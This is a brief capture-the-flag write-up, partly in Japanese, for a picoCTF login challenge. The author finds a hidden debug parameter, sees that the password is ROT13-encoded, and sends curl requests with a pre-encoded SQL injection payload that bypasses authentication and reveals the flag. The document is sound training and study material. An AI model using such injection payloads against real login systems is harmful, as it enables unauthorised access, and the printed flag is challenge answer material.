### ROT13のSQL認証バイパス問題

debug = 0はhidden htmlに記載あり

```
▶ curl -XPOST http://fickle-tempest.picoctf.net:63426/login.php -d "password=abcdef" -d "debug=1" 
<pre>password: abcdef
SQL query: SELECT * FROM admin where password = 'nopqrs'
</pre><h1>Login failed.</h1>% 
```

This is ROT13?

abcdefghijklmnopqrstuvwxyz

↓

nopqrstuvwxyzabcdefghijklm

```
▶ curl -XPOST http://fickle-tempest.picoctf.net:63426/login.php -d "password=a' be 1=1-- " -d "debug=1"
<pre>password: a' be 1=1-- 
SQL query: SELECT * FROM admin where password = 'n' or 1=1-- '
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_2af58a67}</p>%
```